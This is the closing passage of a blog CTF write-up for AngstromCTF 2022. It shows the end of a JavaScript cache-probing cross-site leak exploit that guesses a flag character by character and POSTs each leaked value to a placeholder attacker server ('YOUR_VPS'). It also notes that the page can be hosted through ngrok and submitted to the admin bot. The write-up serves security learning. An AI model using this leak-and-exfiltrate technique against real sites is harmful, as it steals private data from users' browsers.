          <span class="nx">report</span><span class="p">(</span><span class="s2">`isCached success, str=</span><span class="p">${</span><span class="nx">str</span><span class="p">}</span><span class="s2">, i=</span><span class="p">${</span><span class="nx">i</span><span class="p">}</span><span class="s2">, start=</span><span class="p">${</span><span class="nx">start</span><span class="p">}</span><span class="s2">, total=</span><span class="p">${</span><span class="nx">total</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
          <span class="k">return</span> <span class="kc">true</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="kc">false</span>
  <span class="p">}</span>

  <span class="k">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">flag</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">actf{yummy_</span><span class="dl">'</span>
    
    <span class="c1">// NOTE: we can leak the charset first to speed up the process</span>
    <span class="kd">let</span> <span class="nx">chars</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">acefsmntuy_}</span><span class="dl">'</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">''</span><span class="p">)</span>
    <span class="k">while</span><span class="p">(</span><span class="nx">flag</span><span class="p">[</span><span class="nx">flag</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">}</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">char</span> <span class="k">of</span> <span class="nx">chars</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">report</span><span class="p">(</span><span class="dl">'</span><span class="s1">trying:</span><span class="dl">'</span>  <span class="o">+</span> <span class="nx">flag</span> <span class="o">+</span> <span class="nx">char</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">await</span> <span class="nx">isCached</span><span class="p">(</span><span class="nx">flag</span> <span class="o">+</span> <span class="nx">char</span><span class="p">))</span> <span class="p">{</span>
          <span class="nx">flag</span> <span class="o">+=</span> <span class="nx">char</span>
          <span class="nx">report</span><span class="p">(</span><span class="dl">'</span><span class="s1">flag:</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">flag</span><span class="p">)</span>
          <span class="k">break</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="k">async</span> <span class="kd">function</span> <span class="nx">report</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
    <span class="c1">// TODO: change to your VPS</span>
    <span class="k">return</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://YOUR_VPS/</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="na">body</span><span class="p">:</span> <span class="nx">data</span><span class="p">,</span> <span class="na">mode</span><span class="p">:</span> <span class="dl">'</span><span class="s1">no-cors</span><span class="dl">'</span> <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">err</span> <span class="o">=&gt;</span> <span class="nx">err</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><h4 id="there-is-no-cache-partitioning"><span class="mr-2">There is no cache partitioning</span><a href="#there-is-no-cache-partitioning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>Some people find out the fact that cache partitioning didn‚Äôt work in headless chrome (this one is an <a href="https://ctf.zeyu2001.com/2021/uiuctf-2021/yana#this-shouldnt-have-worked">example</a>).</p><p>So you can use the previous script on your page, host it by ngrok and submit this url to admin.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/websec/'>WebSec</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/xss/" class="post-tag no-text-decoration" >xss</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >rce</a> <a href="/tags/xs-leak/" class="post-tag no-text-decoration" >xs-leak</a> <a href="/tags/cookie-bomb/" class="post-tag no-text-decoration" >cookie bomb</a> <a href="/tags/cache-probing/" class="post-tag no-text-decoration" >cache probing</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=AngstromCTF 2022 - to^&amp;url=https://to016.github.io//posts/angstromctf2022/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=AngstromCTF 2022 - to^&amp;u=https://to016.github.io//posts/angstromctf2022/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://to016.github.io//posts/angstromctf2022/&amp;text=AngstromCTF 2022 - to^" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PHPLFI2RCE/">C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE</a><li><a href="/posts/angstromctf2022/">AngstromCTF 2022</a><li><a href="/posts/SWandMITM/">Service worker v√† Man-in-the-Middle Attack</a><li><a href="/posts/noted/">Noted - picoCTF2022</a><li><a href="/posts/31linephp/">31 Line PHP - SPbCTF2021</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/noCookies/"><div class="card-body"> <em class="timeago small" data-ts="1649398020" > 2022-04-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NoCookies - DiceCTF2022</h3><div class="text-muted small"><p> Link challenge https://instancer.mc.ax/no-cookies https://admin-bot.mc.ax/no-cookies Source code Download S∆° l∆∞·ª£c v·ªÅ trang web overview S·∫Ω c√≥ 2 ch·ª©c nƒÉng: Register -&amp;gt; ƒëƒÉng k√≠ account v√† ...</p></div></div></a></div><div class="card"> <a href="/posts/crewctf2022/"><div class="card-body"> <em class="timeago small" data-ts="1650200220" > 2022-04-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CrewCTF 2022</h3><div class="text-muted small"><p> ·ªû post m√¨nh s·∫Ω vi·∫øt writeup cho 4/7 b√†i web c·ªßa gi·∫£i crewctf2022 m√† m√¨nh gi·∫£i ƒë∆∞·ª£c. 1. CuaaS B√†i n√†y ch·ªâ ƒë∆°n gi·∫£n l√† ƒë·ªçc v√† hi·ªÉu ƒë∆∞·ª£c c√°ch ho·∫°t ƒë·ªông c·ªßa trang web th√¨ s·∫Ω gi·∫£i ra. Link challenge h...</p></div></div></a></div><div class="card"> <a href="/posts/nahamconctf2022/"><div class="card-body"> <em class="timeago small" data-ts="1651342200" > 2022-05-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NahamconCTF 2022</h3><div class="text-muted small"><p> Solution for some web challenges solved challenges EXtravagant Upload exp.xml and view it &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;/var/www/flag.t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/nahamconctf2022/" class="btn btn-outline-primary" prompt="Older"><p>NahamconCTF 2022</p></a> <a href="/posts/sandiegoctf2022/" class="btn btn-outline-primary" prompt="Newer"><p>San Diego CTF 2022</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "to016/to016.github.io", "data-repo-id": "R_kgDOHGuNaQ", "data-category": "Comments", "data-category-id": "DIC_kwDOHGuNac4CPNhc", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://twitter.com/nguyendt0">T√¥ ƒê·ªânh Nguy√™n</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
